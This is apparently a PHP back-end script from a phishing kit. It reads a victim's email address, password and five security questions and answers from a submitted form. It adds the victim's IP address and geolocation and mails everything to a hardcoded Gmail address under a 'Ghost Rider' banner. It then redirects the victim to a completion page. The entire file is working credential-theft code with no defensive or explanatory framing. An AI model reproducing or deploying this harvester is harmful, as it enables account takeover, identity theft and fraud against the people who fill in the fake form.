<?php
	
	
	$question1 = $_POST['question1'];
	$answer1 = $_POST['answer1'];
	$question2 = $_POST['question2'];
	$answer2  = $_POST['answer2'];
	$question3 = $_POST['question3'];
	$answer3  = $_POST['answer3'];
	$question4 = $_POST['question4'];
	$answer4  = $_POST['answer4'];
	$question5 = $_POST['question5'];
	$answer5  = $_POST['answer5'];
	$email = $_POST['username'];
	$pass  = $_POST['password'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "===== Details =====\n";
	$message .= "question1		: ".$question1."\n";
	$message .= "answer1		: ".$answer1."\n";
    $message .= "question2		: ".$question2."\n";
    $message .= "answer2		: ".$answer2."\n";
    $message .= "question3		: ".$question3."\n";
	$message .= "answer3		: ".$answer3."\n";
	$message .= "question4		: ".$question4."\n";
	$message .= "answer4		: ".$answer4."\n";
	$message .= "question5		: ".$question5."\n";
	$message .= "answer5		: ".$answer5."\n";
	$message .= "Email Add		: ".$email."\n";
	$message .= "Email pass		: ".$pass."\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$send ="godgreat973@gmail.com";

	$subject = "key l $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	}
?>
<script>
	window.location="complate.html";
</script>

